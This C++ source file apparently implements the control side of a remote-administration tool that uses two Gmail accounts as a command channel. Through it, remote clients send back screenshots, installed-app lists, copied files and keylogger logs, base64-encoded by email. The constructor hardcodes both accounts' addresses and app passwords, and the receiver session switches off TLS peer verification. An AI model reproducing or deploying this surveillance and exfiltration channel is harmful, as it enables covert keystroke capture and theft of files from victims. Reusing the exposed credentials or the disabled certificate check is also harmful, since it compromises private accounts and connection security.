#include "GmailAPI.h"

string imapsURL = "imaps://imap.gmail.com:993/RemoteUltilities";
string smtpURL = "smtp://smtp.gmail.com:587";
string email_payload_text = "";
string confirmation_payload_text = "";

string base64_encode(const string& input) {
	string output;
	int val = 0, valb = -6;
	for (unsigned char c : input) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			output.push_back(base64_chars[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) output.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
	while (output.size() % 4) output.push_back('=');
	return output;
}

string base64_decode(const string& input) {
	vector<int> T(256, -1);
	for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;
	string output;
	int val = 0, valb = -8;
	for (unsigned char c : input) {
		if (T[c] == -1) break;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			output.push_back(char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}
	return output;
}
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	size_t totalSize = size * nmemb;
	string* buffer = static_cast<string*>(userp);
	buffer->append(static_cast<char*>(contents), totalSize);
	return totalSize;
}
void ExtractEmailBody(string& buffer) {
	size_t bodyStart = buffer.find("\r\n\r\n");
	size_t next = buffer.find("\r\n\r\n", bodyStart + 4);
	while (next != -1) {
		bodyStart = next;
		next = buffer.find("\r\n\r\n", bodyStart + 4);
	}
	buffer = buffer.substr(0, bodyStart);
}

void MyCurl::CreateEmail(const string id, const string content) {
	email_payload_text =
		"Subject:" + id + "\r\n\r\n"
		+ content + "\r\n\r\n";
}
void MyCurl::ConfirmEmail(string& recipent, string &content) {
	email_payload_text =
		"Subject: Confirm email\r\n\r\n"
		+ content + "\r\n\r\n";
	curl_slist* recipientTmp = nullptr;
	recipientTmp = curl_slist_append(nullptr, recipent.c_str());
	curl_easy_setopt(sender, CURLOPT_MAIL_RCPT, recipientTmp);
	res = curl_easy_perform(sender);
	// Check for errors
	if (res != CURLE_OK) {
		cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
	}
	else {
		cout << "Email sent successfully!" << endl;
	}
	if (recipientTmp) {
		curl_slist_free_all(recipientTmp);
		recipientTmp = nullptr;
	}
	curl_easy_setopt(sender, CURLOPT_MAIL_RCPT, recipients);
}

void MyCurl::InitSender() {
	sender = curl_easy_init();
	//Set the SMTP server URL
	curl_easy_setopt(sender, CURLOPT_URL, smtpURL.c_str());
	// Enable TLS for secure connection
	curl_easy_setopt(sender, CURLOPT_USE_SSL, CURLUSESSL_ALL);
	//Set the login credentials
	curl_easy_setopt(sender, CURLOPT_USERNAME, clientAccount.c_str());
	curl_easy_setopt(sender, CURLOPT_PASSWORD, clientPassword.c_str());
	//Set the sender email address
	curl_easy_setopt(sender, CURLOPT_MAIL_FROM, clientAccount.c_str());
	//Add recipient(s)
	recipients = curl_slist_append(recipients, serverAccount.c_str());
	curl_easy_setopt(sender, CURLOPT_MAIL_RCPT, recipients);
	// Specify the payload
	curl_easy_setopt(sender, CURLOPT_READFUNCTION, payload_source);
	curl_easy_setopt(sender, CURLOPT_READDATA, &upload_ctx);
	curl_easy_setopt(sender, CURLOPT_UPLOAD, 1L);
}
void MyCurl::InitSenderForFile() {
	sender = curl_easy_init();
	//Set the SMTP server URL
	curl_easy_setopt(sender, CURLOPT_URL, smtpURL.c_str());
	// Enable TLS for secure connection
	curl_easy_setopt(sender, CURLOPT_USE_SSL, CURLUSESSL_ALL);
	//Set the login credentials
	curl_easy_setopt(sender, CURLOPT_USERNAME, clientAccount.c_str());
	curl_easy_setopt(sender, CURLOPT_PASSWORD, clientPassword.c_str());
	//Set the sender email address
	curl_easy_setopt(sender, CURLOPT_MAIL_FROM, clientAccount.c_str());
	//Add recipient(s)
	recipients = curl_slist_append(recipients, serverAccount.c_str());
	curl_easy_setopt(sender, CURLOPT_MAIL_RCPT, recipients);
	// Specify the payload
	curl_easy_setopt(sender, CURLOPT_READFUNCTION, payload_source);
	curl_easy_setopt(sender, CURLOPT_READDATA, &upload_ctx);
	curl_easy_setopt(sender, CURLOPT_UPLOAD, 1L);
}
void MyCurl::InitReceiverSession(string& URL) {
	receiver = curl_easy_init();
	curl_easy_setopt(receiver, CURLOPT_URL, URL.c_str());
	curl_easy_setopt(receiver, CURLOPT_USERNAME, serverAccount.c_str());
	curl_easy_setopt(receiver, CURLOPT_PASSWORD, serverPassword.c_str());
	curl_easy_setopt(receiver, CURLOPT_USE_SSL, CURLUSESSL_ALL);
	curl_easy_setopt(receiver, CURLOPT_SSL_VERIFYPEER, 1L);
	curl_easy_setopt(receiver, CURLOPT_SSL_VERIFYHOST, 2L);
	curl_easy_setopt(receiver, CURLOPT_TRANSFERTEXT, 0L);
	curl_easy_setopt(receiver, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
	curl_easy_setopt(receiver, CURLOPT_SSL_VERIFYPEER, 0L);
	curl_easy_setopt(receiver, CURLOPT_WRITEFUNCTION, WriteCallback);
	curl_easy_setopt(receiver, CURLOPT_WRITEDATA, &receiveBuffer);
}
void MyCurl::CleanSession(CURL*& session, string& buffer) {
	buffer.clear();
	if(session) 
		curl_easy_cleanup(session);
	session = nullptr;
}
vector<int> MyCurl::GetListUIDUnseen() {
	stringstream ss(receiveBuffer);
	string word;
	vector<int> UIDs;
	while (getline(ss, word, ' ')) {
		if (word[0] < '0' || word[0] > '9') continue; //Skip useless text
		UIDs.push_back(stoi(word));
	}
	return UIDs;
}
void MyCurl::SendEmail(const vector<string> IDs, const string content) {
	for (auto& id : IDs) {
		InitSender();
		CreateEmail(id, content);
		res = curl_easy_perform(sender);
		// Check for errors
		if (res != CURLE_OK) {
			cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
		}
		else {
			cout << "Email sent successfully!" << endl;
		}
		CleanSession(sender, email_payload_text);
		upload_ctx = { 0 };
	}
}
void MyCurl::ReadEmail(bool &isAppOn) {
	while (isAppOn) {
		if (!isAutoReceiving) continue;
		if (searchQuery.empty()) continue;
		//Search
		InitReceiverSession(imapsURL);
		curl_easy_setopt(receiver, CURLOPT_CUSTOMREQUEST, searchQuery.c_str());
		//curl_easy_setopt(receiver, CURLOPT_VERBOSE, 1L); // Debug
		res = curl_easy_perform(receiver);
		curl_easy_setopt(receiver, CURLOPT_CUSTOMREQUEST, nullptr);
		UIDs = GetListUIDUnseen();
		CleanSession(receiver, receiveBuffer);
		//Read
		for (int UID : UIDs) {
			string emailURL = imapsURL + ";UID=" + to_string(UID) + "/;SECTION=TEXT";
			InitReceiverSession(emailURL);
			res = curl_easy_perform(receiver);
			ExtractEmailBody(receiveBuffer);
			//***********************************************************************************
			emailQueue.push(receiveBuffer);
			CleanSession(receiver, receiveBuffer);
		}
		UIDs.clear();
	}
}
void MyCurl::UpdateSearchQuery(string id) {
	if (id.empty()) {
		searchQuery = "";
		return;
	}
	searchQuery = "UID SEARCH UNSEEN SUBJECT " + id;
}
void MyCurl::Preprocess() {
	string emailContent = emailQueue.front();
	int start = 0;
	int end = emailContent.find(';', start);
	receiverID = emailContent.substr(start, end - start);
	start = end + 1;
	end = emailContent.find(';', start);
	query = emailContent.substr(start, end - start);
	start = end + 1;
	end = emailContent.find(';', start);
	subContent = emailContent.substr(start, end - start);
}
void MyCurl::ClientProcess() { //Change the result
	int queryInt = stoi(query);
	result = "";
	if (queryInt == 3) {
		while (true) {
			if (filesystem::last_write_time(UIPath) != modifiedTime) {
				this_thread::sleep_for(std::chrono::duration<double>(0.1));
				modifiedTime = filesystem::last_write_time(UIPath);
				fstream file(UIPath, ios::in);
				getline(file, result, ';');
			}
		}
	}
	else {

	}
}
void MyCurl::AdminProcess(const vector<string> IDs, const int query, vector<string> &failedClientIDs) {
	unordered_set<string> IDSet;
	for (auto& ID : IDs) {
		IDSet.insert(ID);
	}
	while (IDSet.size() != 0) {
		while (!emailQueue.empty()) {
			Preprocess();
			if (IDSet.find(receiverID) != IDSet.end()) {
				if (stoi(this->query) == query) {
					if (query == 11) {
						subContent = base64_decode(subContent);
						fstream file(ComPath + "List/ListApp" + receiverID, ios::out | ios::binary);
						file << subContent;
						file.close();
						cout << "Saved ListApp of " + receiverID + " at " + ComPath + "List/ListApp" + receiverID << endl;
					}
					if (query == 22) { //More query, Capture screenshot
						subContent = base64_decode(subContent);
						fstream file(ComPath + "Screenshot/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
						file << subContent;
						file.close();
						cout << "Saved screenshot of " + receiverID + " at " + ComPath + "Screenshot/screenshot" + receiverID << endl;
					}
					else if (query == 20) { //result is fileName, Copy file
						subContent = base64_decode(subContent);
						string fileName = GetFileName();
						fstream file(ComPath + "Copy/" + fileName + receiverID, ios::out | ios::binary);
						file << subContent;
						file.close();
						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Copy/" + fileName + receiverID << endl;
					}
					else if (query == 24) {
						subContent = base64_decode(subContent);
						fstream file(ComPath + "Keylogger/keylogger" + receiverID, ios::out | ios::binary);
						file << subContent;
						file.close();
						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Keylogger/keylogger" + receiverID << endl;
					}
					if (subContent == "N") {
						failedClientIDs.push_back(receiverID);
					}
					IDSet.erase(receiverID);
				}
			}
			else {
				emailStack.push(emailQueue.front());
			}
			emailQueue.pop();
		}
	}
	//waiting for client to send email
}
bool MyCurl::ShouldSendToServer() {
	int queryInt = stoi(query);
	return queryInt > 10;
}
MyCurl::MyCurl(bool& isAppOn) {
	role = Role::NONE;
	isAutoReceiving = false;
    autoReceivingThread = thread(&MyCurl::ReadEmail, this, ref(isAppOn));
	serverAccount = "chillseverctt2@gmail.com";
	serverPassword = "frmc opak fwnu ftos";
	clientAccount = "chillclientctt2@gmail.com";
	clientPassword = "kdsr vqde utzq wtic";
	sender = nullptr;
	res = CURLE_OK;
	recipients = nullptr;
	upload_ctx = { 0 };

	receiver = nullptr;
	UIDs = {};
	receiveBuffer = "";
	searchQuery = "";
	result = "";
	emailQueue = {};
	InitSender();
	UpdateSearchQuery({});
}
MyCurl::~MyCurl() {
	if (recipients) curl_slist_free_all(recipients);
	if (sender) curl_easy_cleanup(sender);
	if (receiver) curl_easy_cleanup(receiver);
	if (autoReceivingThread.joinable())
		autoReceivingThread.join();
}